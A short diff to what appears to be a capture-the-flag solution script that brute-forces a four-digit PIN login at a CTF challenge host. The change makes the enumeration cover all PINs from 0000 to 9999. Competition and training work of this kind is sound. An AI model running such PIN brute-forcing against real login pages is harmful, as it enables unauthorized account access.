@@ -32,7 +32,7 @@ def get_cookie(url, cookie_id):
     return {cookie_id: requests.get(url).cookies[cookie_id]}
 
 #'0000' - '9999'
-pins = [str(i).zfill(4) for i in range(10000)][400:]
+pins = [str(i).zfill(4) for i in range(10000)]
 
 t_url = "http://pin.ctf.tamu.edu/login"
 t_headers={'referer': 'http://pin.ctf.tamu.edu/login'}
